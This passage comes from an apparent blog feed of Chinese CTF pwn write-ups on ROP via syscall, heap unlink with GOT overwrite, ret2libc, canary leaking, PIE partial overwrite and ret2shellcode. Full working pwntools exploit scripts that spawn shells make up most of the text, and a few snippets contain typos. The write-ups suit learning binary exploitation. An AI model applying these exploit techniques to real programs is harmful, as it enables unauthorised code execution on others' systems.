class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x38</span><br><span class="line">payload += p64(rdi)+p64(alarm_got)</span><br><span class="line">payload += p64(rax)+p64(0x5)</span><br><span class="line">payload += p64(add_rdi_al)</span><br></pre></td></tr></table></figure><p>这样我们就成功劫持了alarm函数的got表到syscall上</p><p>第二步就是要使用syscall来调用open<br>这里学习后发现open函数的系统调用是2，所以下面一步也就显而易见了，就是构造int fd = open(“flag”,READONLY);  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(rsi)+p64(0)+p64(0)</span><br><span class="line">payload += p64(rdi)+p64(e.search(&apos;flag&apos;).next())</span><br><span class="line">payload += p64(rdi)+p64(2)</span><br><span class="line">payload += p64(alarm_plt)</span><br></pre></td></tr></table></figure><p>由于open之后，fd一般都是从3开始的，我们之后要构造出read(fd,buf,100)来吧flag给读到bss段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(rsi)+64(bss)+p64(0)</span><br><span class="line">payload += p64(rdi)+p64(3)</span><br><span class="line">payload += p64(rdx)+p64(100)</span><br><span class="line">payload += p64(read_plt)</span><br></pre></td></tr></table></figure><p>最后就是打印flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(rdi)+p64(bss)+p64(printf_plt)</span><br><span class="line">paylaod = payload.ljust(0x200,&apos;\x00)</span><br></pre></td></tr></table></figure><p>然后结束循环进行ROP就能得到flag了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#p = process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&apos;111.198.29.45&apos;,57350)</span><br><span class="line">e = ELF(&apos;./pwn&apos;)</span><br><span class="line">rdi = 0x4008a3</span><br><span class="line">rsi = 0x4008a1</span><br><span class="line">rdx = 0x4006fe</span><br><span class="line">rax = 0x4006fc</span><br><span class="line">add_rdi_al = 0x40070d</span><br><span class="line">flag = 0x601058</span><br><span class="line">bss = 0x601070</span><br><span class="line">printf_plt = e.plt[&apos;printf&apos;]</span><br><span class="line">read_plt = e.plt[&apos;read&apos;]</span><br><span class="line">alarm_plt = e.plt[&apos;alarm&apos;]</span><br><span class="line">alarm_got = e.got[&apos;alarm&apos;]</span><br><span class="line">read_got = e.got[&apos;read&apos;]</span><br><span class="line">write_plt = e.plt[&apos;write&apos;]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(0x200))</span><br><span class="line">#---------------------------edit alarm_got to get syscall-----------</span><br><span class="line">payload = &apos;a&apos;*0x38+p64(rdi)+p64(alarm_got)</span><br><span class="line">payload += p64(rax)+p64(0x5)</span><br><span class="line">payload += p64(add_rdi_al)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#--------------------------use syscall to open flag----------------</span><br><span class="line">payload += p64(rsi)+p64(0)+p64(0)</span><br><span class="line">payload += p64(rdi)+p64(e.search(&apos;flag&apos;).next())</span><br><span class="line">payload += p64(rax)+p64(2)</span><br><span class="line">payload += p64(alarm_plt)</span><br><span class="line"></span><br><span class="line">#---------------------------read flag to bss-------------</span><br><span class="line">payload += p64(rsi)+p64(bss)+p64(0)</span><br><span class="line">payload += p64(rdi)+p64(3)</span><br><span class="line">payload += p64(rdx)+p64(100)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">#----------------------------print flag--------------------------</span><br><span class="line">payload += p64(rdi)+p64(bss)+p64(printf_plt)</span><br><span class="line">print len(payload)</span><br><span class="line">payload = payload.ljust(0x200,&apos;\x00&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.shutdown(&apos;write&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这道题目的知识大部分都是新接触的，所以其中的一些知识掌握的也不是很熟练。还是要多刷题目吧，慢慢填补自己的漏洞。<br>奥利给！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ReeHY-mian-100-Unlink</title>
      <link href="/2020/02/17/ReeHY-mian-100-Unlink/"/>
      <url>/2020/02/17/ReeHY-mian-100-Unlink/</url>
      
        <content type="html"><![CDATA[<p>又是撸了一天的unlink，pwn真的是让人上头呢。这次找的是攻防世界中的一道题目。这道题在当时做的时候使用的是栈溢出的做法，<br>但是看了wp发现其实还是有利用unlink来解题的办法的。这次就花点时间把这道题给复盘一下。</p><a id="more"></a><h2 id="题目基本分析"><a href="#题目基本分析" class="headerlink" title="题目基本分析"></a>题目基本分析</h2><p>程序是一个64位程序，保护就开了一个nx<br><img src="/img/ReeHY-main/1.jpg" alt="avatar"></p><p>放进ida分析后发现程序逻辑还是比较简单的，下面我们来一个个分析</p><p>1.addnote  这个功能就是比较基础的创建堆，并且记录下了堆的大小，以及指向堆的指针位置，同时要注意的是还自己创建了一个<br>地址来记录下这个堆是否在使用之中，这里是一个要注意的点<br>2.edit 就是一个比较简单的编辑模块，根据我们的索引来对数据进行编辑<br>3.delete 这里有几个漏洞点，一个是函数并没有检验下标为负数的情况，这里我们在delete(-2)时，删除的就是记录已经创建的堆<br>的大小的堆。而由于记录size的堆大小是0x14，被释放后进入fastbin，因此之后重新申请的堆仍然会在这个位置，我们就可以对堆的<br>大小进行修改，从而进行堆溢出。</p><p><img src="/img/ReeHY-main/2.jpg" alt="avatar"></p><p>经过这些分析我们就会发现我们其实可以利用unlink漏洞来使记录指向堆指针的地址记录下这个地址前面一些的地址，这样当我们<br>再次编辑的时候其实编辑的就是这个位置的地址了。</p><h2 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h2><p>我们首先先写好几个我们需要用的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def addnote(size,cun,content):</span><br><span class="line">p.recvuntil(&apos;$ &apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;size\n&apos;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&apos;cun\n&apos;)</span><br><span class="line">p.sendline(str(cun))</span><br><span class="line">p.recvuntil(&apos;content\n&apos;)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.recvuntil(&apos;$ &apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;dele\n&apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">p.recvuntil(&apos;$ &apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;edit\n&apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(&apos;content\n&apos;)</span><br><span class="line">p.send(content)</span><br></pre></td></tr></table></figure><h3 id="修改size以进行堆溢出"><a href="#修改size以进行堆溢出" class="headerlink" title="修改size以进行堆溢出"></a>修改size以进行堆溢出</h3><p>之后我们要先创建好大小合适的两个堆空间，并且使用delete函数修改记录size的堆</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">addnote(0x100,0,&apos;a&apos;*0x100)</span><br><span class="line">addnote(0x100,1,&apos;b&apos;*0x100)</span><br><span class="line">delete(-2)</span><br><span class="line">payload = p32(0x200)+p32(0x100)</span><br><span class="line">addnote(0x14,2,payload)</span><br></pre></td></tr></table></figure><p>这时候我们其实已经把记录堆的大小的数据给更改了，下面我们就进行堆溢出来构造fakechunk</p><h3 id="构造unlink"><a href="#构造unlink" class="headerlink" title="构造unlink"></a>构造unlink</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ptr = 0x6020e0</span><br><span class="line">fakefd = ptr - 0x18</span><br><span class="line">fakebk = ptr - 0x10</span><br><span class="line">payload = p64(0)+p64(0x100)  #fake chunk&apos;s size and pre_size</span><br><span class="line">payload += p64(fakefd)+p64(fakebk)  </span><br><span class="line">payload +=&apos;a&apos;*(0x100-0x20)  </span><br><span class="line">payload += p64(0x100) #overwrite nextchunk&apos;s pre_size make it believe that prve chunk is free</span><br><span class="line">payload += p64(0x110) </span><br><span class="line">edit(0,payload)</span><br><span class="line">delete(1)</span><br></pre></td></tr></table></figure><p><img src="/img/ReeHY-main/3.jpg" alt="avatar"></p><p>这里我们发现在执行完unlink后ptr[0]已经被修改了</p><h3 id="修改got表进行泄漏"><a href="#修改got表进行泄漏" class="headerlink" title="修改got表进行泄漏"></a>修改got表进行泄漏</h3><p>我们在构造payload的时候需要注意本程序是自己构造了一个地址来记录堆是否在使用之中的，因此我们需要把这和数据加在payloa<br>d中。在泄漏出libc中函数地址后，直接计算出libc基址，就能得到system地址，然后把atoi函数的got表改写成system函数的地址<br>，这样当我们调用atoi函数的时候，其实调用的就是system函数了。<br>这里我们需要注意的一个点就是题目里给的libc其实是不能用的，所以我使用了LibcSearcher。具体使用方法我在之前的文章中已经<br>详细介绍过了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;\x00&apos;*0x18+p64(free_got)+p64(1)+p64(puts_got)+p64(1)+p64(atoi_got)+p64(1)</span><br><span class="line">edit(0,payload)</span><br><span class="line">edit(0,p64(puts_plt)) #when we free(1),we could puts puts_got</span><br><span class="line">delete(2)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">obj = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr-obj.dump(&apos;puts&apos;)</span><br><span class="line">#libc_base = puts_addr-libc.sym[&apos;puts&apos;]</span><br><span class="line">#system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">system = libc_base + obj.dump(&apos;system&apos;)</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(2,payload)</span><br></pre></td></tr></table></figure><h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实说白了，unlink漏洞的利用就是一个孰能生巧的过程。我们在这里面主要需要拥有的就是我们自己构造payload的能力，同时还<br>需要我们发现可利用的例如堆溢出方面的漏洞的能力。之前做的几道题目之中，其实很少有一个比较直接的让你去进行堆溢出构造之<br>类的题目，所以重要的还是我们如何能做到溢出，这一点还是需要好好打磨一下的。希望之后的比赛能够取得令自己满意的成绩吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出的总结</title>
      <link href="/2020/02/08/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2020/02/08/%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>已经好久没有做过栈方面的的题目了，虽然现在比赛中有关栈的题目已经越来越少了，但是这方面的功夫还是不应该落下，就乘着这<br>这段时间把有关栈方面的知识都好好总结一下，省的到了比赛的时候碰到了又是手忙脚乱的。</p><a id="more"></a><h2 id="简单的ret2libc"><a href="#简单的ret2libc" class="headerlink" title="简单的ret2libc"></a>简单的ret2libc</h2><p>一般来说，没有pie保护和canary的程序，都是可以通过ret2libc这种通用的解题思路来进行处理的，方法就是利用栈溢出的漏洞来<br>进行一些信息的泄露，比如函数的真实地址，然后通过计算得到libc的基址，之后所有的问题就都可以迎刃而解了。当我们并不清楚<br>这个程序的libc版本时，则可以利用python的LibcSearcher这个库来直接得到我们泄露出来的函数再libc中的offset。这种方法是<br>我在做栈方面的题目是所使用的一种比较通用的方法，思路也是比较清晰的。</p><p>下面我们通过攻防世界中的pwn-100这道题来进行一个简单的分析</p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/1.jpg" alt="avatar"></p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/2.jpg" alt="avatar"></p><p>这里通过简单的分析发现这个程序有一个十分明显的栈溢出漏洞，并且在输入完0xc8个字节后才会停止输入。这个栈溢出漏洞就能够帮助我们</p><p>然后还需要的辅助工作就是利用ROPgadgets来获取我们所需要的gadgets</p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/3.jpg" alt="avatar"></p><p>这里我们需要的就是pop rdi  ret这个gadgets，这样当我们压入我们需要的数据之后，只要通过这个gadgets就可以让rdi的值<br>变成我们需要的值</p><p>接下来通过这个漏洞泄露出puts函数的真实地址，然后布置一个虚假的返回地址使其重新返回到main函数，进行第二次利用。<br>利用LibcSearcher就可以得到libc版本信息以及所有的offset，再次进行栈溢出就可以getshell</p><p>给出exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher </span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./pwn100&apos;)</span><br><span class="line">e = ELF(&apos;./pwn100&apos;)</span><br><span class="line">main = 0x4006b8</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">pop_rdi = 0x400763</span><br><span class="line">payload =  &apos;a&apos;*0x40 +&apos;b&apos;*8 +p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">payload = payload.ljust(0xc8,&apos;a&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&apos;bye~\n&apos;)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">obj = LibcSearcher(&apos;puts&apos;,puts_addr)</span><br><span class="line">libc_base = puts_addr-obj.dump(&apos;puts&apos;)</span><br><span class="line">system = libc_base + obj.dump(&apos;system&apos;)</span><br><span class="line">binsh = libc_base + obj.dump(&apos;str_bin_sh&apos;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload2 = &apos;a&apos;*0x47+p64(pop_rdi)+p64(binsh)+p64(system)+p64(0xdeadbeef) #0x47是因为复用后栈上会有一个字节坏掉</span><br><span class="line">payload2 = payload2.ljust(200,&apos;a&apos;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里遇到的一个问题就是当我们进行了第一次泄露之后，当返回main函数后，不知道为什么栈上会坏掉一个字节，这点还需要后期的<br>调试来进行分析，就以后再进行解释。而且我发现别的做题者在使用和我基本相同的方式时栈就不会出现问题，真的把我的头都要气<br>掉了！！！！！！淦！！！！</p><p>ps：经过调试后发现只要在送第一个payload的时候使用send而不是sendline，返回后的栈就不会坏掉，具体原因还需要进一步的<br>学习</p><p>本道题还有一个不使用LibcSearcher库的解题思路，那就是利用DynELF和ret2csu这个通用gadgets，这样的话题目会变得比较复杂<br>这个通用gadgets的有关内容我会在下一篇文章中再进行介绍总结，本文就不细说了。</p><hr><h2 id="canary保护的bypass技巧"><a href="#canary保护的bypass技巧" class="headerlink" title="canary保护的bypass技巧"></a>canary保护的bypass技巧</h2><p>canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致</p><p>这里可以随便打开一个32位的程序来看一看</p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/4.jpg" alt="avatar"></p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/5.jpg" alt="avatar"></p><p>这里我们可以看到，函数结束的时候，程序会检查canary的值是否和院线存入栈中的值相同，如果因为栈溢出或者其他原因导致<br><em>canary</em>的值发生了变化，那么就会执行___stack_chk_fai函数，从而终止程序</p><p>而想要绕过canary保护，其实方法还是很多的，这里就介绍最基础的一种，直接通过漏洞来把canary泄露出来</p><h3 id="栈溢出泄露canary"><a href="#栈溢出泄露canary" class="headerlink" title="栈溢出泄露canary"></a>栈溢出泄露canary</h3><p>canary的值是以”\x00”来结尾的，其目的就是保证canary可以截断字符串。因此，泄露栈中的canary的思路就是通过覆盖canary的<br>低字节，以打印出剩下的部分<br>还是上面那个例子，题目很简单，应该算是canary的启蒙题，直接给出自己的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./canary&apos;)</span><br><span class="line">shell = 0x0804859b</span><br><span class="line">payload1 = &apos;a&apos;*(0x70-0xc)+&apos;b&apos;</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">#print p.recv()</span><br><span class="line">p.recvuntil(&apos;a&apos;*0x64)</span><br><span class="line">canary = u32(p.recv(4))-0x62</span><br><span class="line">print hex(canary)</span><br><span class="line">payload2 = &apos;a&apos;*0x64+p32(canary)+&apos;b&apos;*12+p32(shell)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里可以看到我们在送进去第一个payload之后，我们用’b’来覆盖了canary的低字节，这样就可以让字符串不被’\x00’给截断<br>从而让printf函数把canary也当成是变量给输出出来，所以接收到之后只要在减去0x62，低字节又变成了00，就是正确的<br>canary了，之后就是比较正常的rop拿到shell</p><h3 id="利用格式化字符串漏洞泄露canary"><a href="#利用格式化字符串漏洞泄露canary" class="headerlink" title="利用格式化字符串漏洞泄露canary"></a>利用格式化字符串漏洞泄露canary</h3><p>同样是上面的例子，由于师兄那时候出题时的疏忽，所以这道题其实还有一个格式化字符串的漏洞。这里我们简单的计算一下偏移，<br>格式化字符串的偏移是6，再加上canary的偏移应该是25(100/4)，那就是三十一，所以输入%31$p就能够直接把canary打印出来。<br>就不进行赘述了</p><h3 id="逐位爆破canary"><a href="#逐位爆破canary" class="headerlink" title="逐位爆破canary"></a>逐位爆破canary</h3><p>这种类型的做法一般存在于当程序存在fork函数的时候，，当程序进入到子程序的时候，其canary的值和父程序的值相同，所以我<br>就可以一位一位的把canary给爆破出来。这种题目我暂时还没有做到，但是网上已经有比较详细的讲解了，等做到这类型的题目我在<br>进行补充吧</p><hr><h2 id="PIE机制的bypass技巧"><a href="#PIE机制的bypass技巧" class="headerlink" title="PIE机制的bypass技巧"></a>PIE机制的bypass技巧</h2><p>PIE机制真的是一生之敌，学pwn这么久一直没有对PIE机制进行一个比较完整的总结，对这一类的题目也总是敷衍了事，但事实上<br>现在的比赛中PIE出现的频率是极高的，所以深入学习一下PIE机制也是十分有必要的。</p><p>那么PIE到底是什么呢?</p><p>PIE中文解释为地址无关可执行文件，该技术针对的是代码段(.text),数据段(.data)以及未初始化全局变量段(.bss)。当开启了<br>这个保护后，每一次程序加载，这些地址都会发生变化，所以我们也就不能直接利用ROPgadgets等工具来进行解题。</p><p>下面介绍几个比较常规的解题思路</p><h3 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h3><p>这个思路利用了PIE的技术缺陷。内存使用的是页载入机制，即便开启了PIE保护，也只能影响到单页的内存，即0x1000大小<br>的内存页，这就是说不论程序如何加载，每一个指令的后三位始终不会发生变化。因此我们可以利用漏洞覆写地址的后几位来<br>控制程序流。</p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/6.jpg" alt="avatar"></p><p>这是一道很基础的栈溢出，有canary，也开启了PIE保护。所以第一次输出写泄露出canary，第二次则是覆写控制程序。<br><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/7.jpg" alt="avatar"><br>这里需要注意的是由于本程序的代码段都很小，所以我们可以推测后门函数只有后两位和返回函数不相同,即我们只需要覆写最后<br>两个字节为‘3e’就可以了</p><p>exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">p=process(&quot;./babypie&quot;)</span><br><span class="line">#p=remote(&quot;47.102.202.175&quot;,10004)</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*0x28</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">canary=u64(p.recv(8))-0xa</span><br><span class="line"></span><br><span class="line">log.info(&quot;canary:&quot;+hex(canary))#put candy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*0x28+p64(canary)+p64(0xdeffdeff)+&quot;\x3e&quot;#pianyiliang</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="泄露地址以及vsyscall"><a href="#泄露地址以及vsyscall" class="headerlink" title="泄露地址以及vsyscall"></a>泄露地址以及vsyscall</h3><p>这个方面的内容篇幅较大，我会在之后的文章里面重新进行梳理总结的。</p><hr><h2 id="一波ret2shellcode补充"><a href="#一波ret2shellcode补充" class="headerlink" title="一波ret2shellcode补充"></a>一波ret2shellcode补充</h2><p>最近在刷buuctf，发现了很多有趣的题目，这里面的知识点都是比较有用的，所以会做一题就记录一题，希望后天的网鼎杯可以多<br>刷几道题目吧</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里做到了<em>ez_pz_hackover_2016</em>这道题，经过分析后发现这道题的保护几乎是全关的，这就给我们利用shellcode留下了很大的<br>空间。下面我们看一下ida的汇编<br><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/8.jpg" alt="avatar"></p><p><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/9.jpg" alt="avatar"><br>这里发现程序的逻辑还是比较简单的。首先程序会给一个栈地址，然后利用fgets函数来读取一个字符串，并且这个字符串需要经过<br>过滤，然后进入vuln函数，这里存在一个栈溢出漏洞，会将我们读取的字符串赋值给dest。那么只要我们绕过了程序的简单过滤，并且<br>将shellcode写在栈上，我们就可以顺利的拿到shell了。</p><p>在经过这样的分析之后，本题就只剩下一个需要考虑的地方了，那就是计算出题目所给的栈地址与shellcode的偏移。<br>这里使用简单的gdb调试就能得到了<br><img src="/img/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%80%BB%E7%BB%93/10.jpg" alt="avatar"><br>经过简单的调试得到offset = 0xfff9cc1c - 0xfff9cc00 = 0x1c<br>这道题目就这样解决了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;i386&apos;</span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">#p = remote(&apos;node3.buuoj.cn&apos;,25325)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(&apos;crash: &apos;)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">print hex(stack_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#payload = &apos;crashme\x00&apos;+shellcode     #debug()</span><br><span class="line">payload = &apos;crashme\x00&apos;+&apos;a&apos;*18+p32(stack_addr-0x1c)+shellcode</span><br><span class="line">#pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>上文介绍的就是栈溢出方面的基本的保护方式以及解题思路，这些都算是pwn题中比较基础的部分，现在在比赛中出现的也是越来<br>越少。但学习pwn总是要从基础学起嘛，囫囵吞枣总归没有脚踏实地来的好。</p><p>之后还会陆续总结一些栈溢出方面的骚操作以及比较实用的小技巧。总结完这一波就又要开始撸堆了，太痛苦了…….</p><p>冲冲冲！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2014 HITCON CTF-stkof</title>
      <link href="/2020/02/05/2014-HITCON-CTF-stkof/"/>
      <url>/2020/02/05/2014-HITCON-CTF-stkof/</url>
      
